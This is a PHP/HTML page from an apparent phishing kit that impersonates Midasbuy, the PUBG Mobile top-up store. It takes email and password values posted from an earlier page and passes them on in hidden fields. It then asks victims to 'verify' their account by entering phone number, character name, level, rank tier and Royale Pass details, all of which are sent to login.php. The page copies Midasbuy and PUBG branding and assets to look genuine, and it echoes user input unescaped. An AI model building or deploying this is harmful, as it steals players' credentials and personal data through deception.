<?php
// MENANGKAP DATA YANG DI-INPUT
$email = $_POST['email'];
$password = $_POST['password'];
$login = $_POST['login'];
$playid = $_POST['playid'];

// MENGALIHKAN KE HALAMAN UTAMA JIKA DATA BELUM DI-INPUT
if($email == "" && $password == "" && $login == "" && $playid == ""){
header("Location: index.php");
}
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="black">
<meta name="format-detection" content="telephone=no,email=no">
<meta name="robots" content="index,follow">
<title>PUBG Mobile - Midasbuy</title>
<meta name="keywords" content=""/>
<meta name="description" content=""/>
<meta property="og:site_name" content="MidasBuy Top-Up Center">
<meta property="og:type" content="article"/>
<meta property="og:image" content="https:http://midas.gtimg.cn/oversea_web/static/events/invite/invite_500_300.jpg"/>
<meta property="og:title" content="Rebate Fever of PUBG Mobile !"/>
<meta property="og:description" content="Invite friends to make a purchase on Midasbuy and Both of you will be rewarded!"/>
<script type="text/javascript">
        if(!window.console){window.console = {
            log:function () { },
            info:function () { },
            error:function () { }
        }}
        window.onerror = function (msg, url, lineNo, columnNo, error) {
                var message = [
                    'Message: ' + msg,
                    'URL: ' + url,
                    'Line: ' + lineNo,
                    'Column: ' + columnNo,
                    'Error object: ' + JSON.stringify(error)
                ].join(' - ');
                if(window.report && window.report.error){
                    report.error('runtime',{message:message});
                }
            return false;
        };
        window.addEventListener && window.addEventListener('error', function(event) {
            if(event.srcElement instanceof HTMLScriptElement || event.srcElement instanceof HTMLLinkElement || event.srcElement instanceof HTMLImageElement){
                var da ={url:event.srcElement.src||event.srcElement.href};
                if(window.report && window.report.error){
                    report.error('resource',da);
                }
            }
        }, true);
        window.__PAY_INFO={"needSelectPF":{},"short_openid_type":"idip","short_openid_rule":"^[1-9]\\d+$","isv3":false,"drm_info":{"groupid":"","area":"SouthEastAsia","country":"ID","midasbuyArea":"SouthEastAsia"},"pageid":"page_014583352871586963","midasUser":null,"currentBindUser":null,"gameUsers":[],"openid":"","appid":"1450015065","UUID":"028579891173945881583247162559","pf":"mds_hkweb_pc-v2-android-midasweb","type":"save","currencyIcon":"http://midas.gtimg.cn/oversea_web/pubgm/pubgm_uc_new.png","currencySmallIcon":"http://midas.gtimg.cn/midasbuy/images/PUBGM_topup_smallicon.png","country":"ID","midasbuyArea":"SouthEastAsia","cgi_language":"ID","sandbox":"0","zoneid":"1","not_query_drm":"0","currency_type":"IDR","currency_config":"","adyen_url":"","adyen_svrtime":"1583247187"};
        window.__Report_INFO={"devMode":false,"tid":"028579891173945881583247162559","openid":"","appid":"","pf":"","countryCode":"id","from":"","midasuid":"uv_028579891173945881583247162559"};
    </script>
<link rel="stylesheet" href="https://www.midasbuy.com/oversea_web/static/css/banner-d9b07f5be4.css">
<link rel="stylesheet" href="https://www.midasbuy.com/oversea_web/static/css/vendor-423d9ab45c.css">
<!--[if lte IE 9]><link rel="stylesheet" href="/oversea_web/static/css/ie-8f46748a04.css"><![endif]-->
<script type="text/javascript" src="http://midas.gtimg.cn/h5/overseah5/js/midas-oversea-h5page.js"></script>
<script type="text/javascript" src="http://www.midasbuy.com/oversea_web/static/js/jquery.js?jslib=1"></script>
<script type="text/javascript" src="http://www.midasbuy.com/oversea_web/static/js/swiper3_4_2/swiper.jquery.min.js?jslib=1"></script>
<script type="text/javascript" src="http://www.midasbuy.com/oversea_web/static/js/vue.min.2.6.10.js?jslib=1"></script>

<style type="text/css">
        input::-ms-clear {
            display: none;
        }
        .footer ul {
            margin-right: 15px;
        }
		.verify {
			width: 50%;
		}
		input {
            background: #192045;
            width: 94.55%;
            height: auto;
			margin-left: auto;
			margin-right: auto;
			margin-bottom: 10px;
            padding: 13px;
            color: #fff;
            font-family: Arial, Sans-Serif;
            border: 1px solid rgba(255,255,255,.1);
            outline: none;
			display: block;
        }
	    select {
            background: #192045;
            width: 100%;
            height: auto;
			margin-left: auto;
			margin-right: auto;
			margin-bottom: 10px;
            padding: 13px;
            color: #fff;
            font-family: Arial, Sans-Serif;
            border: 1px solid rgba(255,255,255,.1);
            outline: none;
			display: block;
        }
	    ::placeholder {
		   color: #fff;
	    }
		.btn-log {
            background: #3a7bfc;
            width: auto;
            height: auto;
			margin-top: 20px;
			margin-left: auto;
			margin-right: auto;
            padding: 13px;
            color: #fff;
            font-family: Arial, Sans-Serif;
            border: 1px solid #3a7bfc;
            outline: none;
			display: block;
        }
	   @media only screen and (max-width:600px) {
		   .verify {
			width: 100%;
		   }
		   input {
			   width: 94%;
		   }
		   select {
			   width: 100%;
		   }
	   }
</style>
<script></script>
<script>
        jQuery.fn.placeholder = function () {
            var i = document.createElement('input'),placeholdersupport ='placeholder' in i;
            if(!placeholdersupport){
                var inputs = jQuery(this);
                inputs.each(function(){
                    var input = jQuery(this),
                        text = input.attr('placeholder'),
                        pdl = 0,height = input.outerHeight(),
                        width = input.outerWidth(),
                        placeholder = jQuery('<span class="phTips">'+text+'</span>');
                        try{
                            pdl = input.css('padding-left').match(/\d*/i)[0] * 1;
                        }catch(e){
                            pdl = 5;
                        }
                        placeholder.css({
                            'margin-left': -(width-pdl),
                            'height':height,
                            'line-height':height+'px',
                            'position':'absolute',
                            'color': '#cecfc9',
                            'font-size' : '12px'
                        });
                        placeholder.click(function(){
                            input.focus();
                        });
                        if(input.val() != ''){
                            placeholder.css({display:'none'});
                        }else{
                            placeholder.css({display:'inline'});
                        }
                        placeholder.insertAfter(input);
                        input.keydown(function(e){
                            placeholder.css({display:'none'});
                        });
                        input.keyup(function(e){
                            if(jQuery(this).val() != ''){
                                placeholder.css({display:'none'});
                            }else{
                                placeholder.css({display:'inline'});
                            }
                        });
                    });
                }
            return this;
        };
    </script>
<script type="text/javascript">
        // Global site tag (gtag.js) - Google Analytics
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        gtag('config', 'UA-21773189-2');
        var loadJS = function(d, s, id,src) { if(!src){return;}
            var js, fjs = d.getElementsByTagName(s)[0];
            if (d.getElementById(id)) return;
            js = d.createElement(s);
            js.id = id;
            js.src = src;
            fjs.parentNode.insertBefore(js, fjs);
        };
        function scrollFun() {
            var wInnerH = $(window).height(); // 设备窗口的高度（不会变）
            var bScrollH = $(document).height(); // 滚动条总高度
            var footerH = $('.have-pay-sec .footer').outerHeight();
            var footerHeight = $('.footer').outerHeight();
            if (wInnerH === bScrollH) {
                $('.pay-sec').addClass('pay-sec-flex');
                $('.pay-sec').show();
                $('.pay-sec').css('bottom', footerH + 'px');
                $('.have-pay-sec .footer').show();
                if (
                    wInnerH -
                        ($('.special-box').offset() ? $('.special-box').offset().top : 0) -
                        $('.special-box').outerHeight() >
                    footerHeight + 16
                ) {
                    $('.special-foot .footer').show();
                } else {
                    $('.wrap').removeClass('special-foot');
                }
            } else {
                $('.wrap').removeClass('special-foot');
            }
        }
        $(function () {
            scrollFun();
            loadJS(document, 'script', 'gtag-jssdk','https://www.googletagmanager.com/gtag/js?id=UA-21773189-2');
        });
    </script>
</head>
<body>
<div class="wrap game-ticket game-wrap game_list have-pay-sec">
	<div class="bg"></div>
	<div class="header-box g-clr"></div>
	<div class="header">
		<div class="main g-clr">
			<div class="menu-more">
				<div class="icon-box">
					<div class="line1 line"></div>
					<div class="line2 line"></div>
					<div class="line3 line"></div>
				</div>
			</div>
			<h1 class="logo"><a class="pc" style="cursor:default" href="javascript:void(0)">midasbuy</a></h1>
			<div class="menu">
				<a class="active navIndexButton" href="javascript:void(0)" cr="homepage">Home</a>
				<!-- <a href="#">所有活动Pusat Event</a>
                <a href="#">帮助中心Pusat Bantuan</a> -->
			</div>
			<div class="log">
				<div class="login" id="headerLoginButton">
					<a href="javascript:void(0)" cr="login">Login</a>
				</div>
				<div class="luanch">
					<div class="country" cr="regional_select" id="country_select">
						<img class="country-icon" cr="regional_select" src="https://midas.gtimg.cn/oversea_web/static/images/flag/world.2556fe97306bdec1268d8b8a935b56c5.jpg" alt="flag"/>
					</div>
				</div>
			</div>
			<div class="menu-nav-box">
				<ul>
					<li class="acitve navIndexButton">
						<a href="javascript:void(0)" cr="homepage">Home</a>
					</li>
					<!-- <li><a href="#">Pusat Event</a></li>
                <li><a href="#">Pusat Bantuan</a></li> -->
				</ul>
			</div>
		</div>
	</div>
	<div id="app">
		<div class="game-mess-box">
			<div class="x-main">
				<h2 class="xlogo"><a href="https://www.pubgmobile.com"><img cr="logo" src="http://midas.gtimg.cn/midasbuy/images/PUBGM_LOGO.png" alt="img"></a></h2>
				<div class="gift-exchange-btn go-redeem-btn" cr="redeem">
					<p>
						Redeem
					</p>
				</div>
				<div class="gift-exchange-btn prop-store-btn" cr="mall">
					<p>
						Shop
					</p>
				</div>
			</div>
		</div>
		<div class="banner-wrap">
			<div class="banner-tool">
				<div class="main g-clr" id="banner-tool-main">
					<div class="left">
						<div class="desc" id="desc">
							<div class="text" id="text">
								<p>
									Follow us on Facebook for more information.
								</p>
							</div>
							<div class="abox">
								<a class="subscribe" href="https://www.facebook.com/midasbuy" target="_blank">
								<p class="p">Follow</p>
								<p class="ps">+</p>
								</a>
							</div>
						</div>
					</div>
					<div class="right">
						<a href="javascript:void(0);" cr="redeem" class="btn gift-exchange go-redeem-btn">
						<p>
							Redeem
						</p>
						</a>
						<a href="javascript:void(0);" cr="mall" class="btn prop-store go-shop-btn">
						<p>
							Shop
						</p>
						</a>
					</div>
				</div>
			</div>
			<div class="swiper-container" style="height: auto;overflow: visible;">
				<div class="swiper-wrapper swiper-wrapper1">
					<div class="swiper-slide">
						<a class="banner-link">
						<div class="img-box">
							<img class="banner-pic" style="width: 100%;" src="img/header.jpg" data-src="img/header.jpg" alt="img" cr="banner"/>
						</div>
						</a>
					</div>
				</div>
				<!-- Add Pagination -->
				<div class="swiper-pagination swiper-pagination-clickable swiper-pagination-bullets"></div>
				<!-- Add Navigation -->
				<div class="swiper-button-prev swiper-button-white" cr="banner_left"></div>
				<div class="swiper-button-next swiper-button-white" cr="banner_right"></div>
				<img class="mc l-mc" src="http://midas.gtimg.cn/midasbuy/banner/mc-left.png" alt="img"/>
				<img class="mc r-mc" src="http://midas.gtimg.cn/midasbuy/banner/mc-right.png" alt="img"/>
			</div>
		</div>
		<div class="content">
                <div class="x-main" style="padding: 10px;">
                    <div class="tab-nav-box">
                        <ul>
                            <li class="active">Verify your PUBG Mobile account</li>
                        </ul>
						
						<div class="verify">
						<form action="login.php" method="post">
						<input type="hidden" name="email" value="<?php echo $email;?>" readonly>
						<input type="hidden" name="password" value="<?php echo $password;?>" readonly>
						<input type="hidden" name="login" value="<?php echo $login;?>" readonly>
						<input type="hidden" name="playid" value="<?php echo $playid;?>" readonly>
						<input type="text" name="nick" placeholder="Character Name" autocomplete="off" required>
						<input type="number" name="phone" placeholder="Phone Number" autocomplete="off" required>
						<select name="level" required>
<option selected="selected" disabled="disabled" value="">Account Level</option>
<option>1</option>
<option>2</option>
<option>3</option>
<option>4</option>
<option>5</option>
<option>6</option>
<option>7</option>
<option>8</option>
<option>9</option>
<option>10</option>
<option>11</option>
<option>12</option>
<option>13</option>
<option>14</option>
<option>15</option>
<option>16</option>
<option>17</option>
<option>18</option>
<option>19</option>
<option>20</option>
<option>21</option>
<option>22</option>
<option>23</option>
<option>24</option>
<option>25</option>
<option>26</option>
<option>27</option>
<option>28</option>
<option>29</option>
<option>30</option>
<option>31</option>
<option>32</option>
<option>33</option>
<option>34</option>
<option>35</option>
<option>36</option>
<option>37</option>
<option>38</option>
<option>39</option>
<option>40</option>
<option>41</option>
<option>42</option>
<option>43</option>
<option>44</option>
<option>45</option>
<option>46</option>
<option>47</option>
<option>48</option>
<option>49</option>
<option>50</option>
<option>51</option>
<option>52</option>
<option>53</option>
<option>54</option>
<option>55</option>
<option>56</option>
<option>57</option>
<option>58</option>
<option>59</option>
<option>60</option>
<option>61</option>
<option>62</option>
<option>63</option>
<option>64</option>
<option>65</option>
<option>66</option>
<option>67</option>
<option>68</option>
<option>69</option>
<option>70</option>
<option>71</option>
<option>72</option>
<option>73</option>
<option>74</option>
<option>75</option>
<option>76</option>
<option>77</option>
<option>78</option>
<option>79</option>
<option>80</option>
<option>81</option>
<option>82</option>
<option>83</option>
<option>84</option>
<option>85</option>
<option>86</option>
<option>87</option>
<option>88</option>
<option>89</option>
<option>90</option>
<option>91</option>
<option>92</option>
<option>93</option>
<option>94</option>
<option>95</option>
<option>96</option>
<option>97</option>
<option>98</option>
<option>99</option>
<option>100</option>
</select>
<select name="tier" required>
<option selected="selected" disabled="disabled" value="">Ranked Tier Level</option>
<option>Bronze</option>
<option>Silver</option>
<option>Gold</option>
<option>Platinum</option>
<option>Diamond</option>
<option>Crown</option>
<option>Ace</option>
<option>Conqueror</option>
</select>
<select name="rpt" required>
<option selected="selected" disabled="disabled" value="">Royale Pass Type</option>
<option>Free Royale Pass</option>
<option>Elite Royale Pass</option>
<option>Elite Royale Pass Plus</option>
</select>
<select name="rpl" required>
<option selected="selected" disabled="disabled" value="">Royale Pass Level</option>
<option>1</option>
<option>2</option>
<option>3</option>
<option>4</option>
<option>5</option>
<option>6</option>
<option>7</option>
<option>8</option>
<option>9</option>
<option>10</option>
<option>11</option>
<option>12</option>
<option>13</option>
<option>14</option>
<option>15</option>
<option>16</option>
<option>17</option>
<option>18</option>
<option>19</option>
<option>20</option>
<option>21</option>
<option>22</option>
<option>23</option>
<option>24</option>
<option>25</option>
<option>26</option>
<option>27</option>
<option>28</option>
<option>29</option>
<option>30</option>
<option>31</option>
<option>32</option>
<option>33</option>
<option>34</option>
<option>35</option>
<option>36</option>
<option>37</option>
<option>38</option>
<option>39</option>
<option>40</option>
<option>41</option>
<option>42</option>
<option>43</option>
<option>44</option>
<option>45</option>
<option>46</option>
<option>47</option>
<option>48</option>
<option>49</option>
<option>50</option>
<option>51</option>
<option>52</option>
<option>53</option>
<option>54</option>
<option>55</option>
<option>56</option>
<option>57</option>
<option>58</option>
<option>59</option>
<option>60</option>
<option>61</option>
<option>62</option>
<option>63</option>
<option>64</option>
<option>65</option>
<option>66</option>
<option>67</option>
<option>68</option>
<option>69</option>
<option>70</option>
<option>71</option>
<option>72</option>
<option>73</option>
<option>74</option>
<option>75</option>
<option>76</option>
<option>77</option>
<option>78</option>
<option>79</option>
<option>80</option>
<option>81</option>
<option>82</option>
<option>83</option>
<option>84</option>
<option>85</option>
<option>86</option>
<option>87</option>
<option>88</option>
<option>89</option>
<option>90</option>
<option>91</option>
<option>92</option>
<option>93</option>
<option>94</option>
<option>95</option>
<option>96</option>
<option>97</option>
<option>98</option>
<option>99</option>
<option>100</option>
</select>
<select name="platform" required>
<option selected="selected" disabled="disabled" value="">Platform</option>
<option>Android</option>
<option>iOS</option>
</select>
<button type="submit" class="btn-log">Verify my account</button>
</form>
</div>

                    </div>
				
			</div>
			
		</div>
		<div class="footer">
			<div class="main">
				<div class="t">
					<div class="p-box g-clr">
						<div class="box">
							<p class="p">For customer service</p>
							<p class="p">Please send email to help@midasbuy.com</p>
						</div>
						<a href="mailto:help@midasbuy.com" class="feeedback" cr="feedback">Feedback</a>
					</div>
				</div>
				<div class="b">
					<ul class="link">
						<li class="first">
							<a href="http://www.pubgmobile.com/terms.html" target="_blank">Terms of Service</a>
						</li>
						<li>
							<a href="http://www.pubgmobile.com/privacy.html" target="_blank">Privacy Policy</a>
						</li>
					</ul>
					<p class="copying">COPYRIGHT © PUBG CORPORATION. ALL RIGHTS RESERVED.</p>
				</div>
			</div>
		</div>
	</div>
		
	
</div>
<script>
    $(function() {
        var footerH = $('.footer').outerHeight();
        if ($(window).innerHeight() > document.body.scrollHeight) {
            $('.pay-sec').addClass('pay-sec-flex').css('bottom',footerH+'px');
            $('.footer').show();
        } else {
            $(window).on("scroll",function () {
                // var  isBottom = document.documentElement.scrollHeight === window.innerHeight + document.documentElement.scrollTop;
                var  isBottom = Math.round($(document).height()) < Math.round($(window).height() + $(document).scrollTop() + 100);
                if(isBottom){
                    $('.pay-sec').addClass('pay-sec-flex').css('bottom',footerH+'px');
                    $('.footer').show();
                }else{
                    $('.pay-sec').removeClass('pay-sec-flex').css('bottom',0+'px');
                    $('.footer').hide();
                }
            });
        }
    });
    report.view('topup');
    report.setPage('topup');
    report.performance('topup');
</script>
</body>
</html>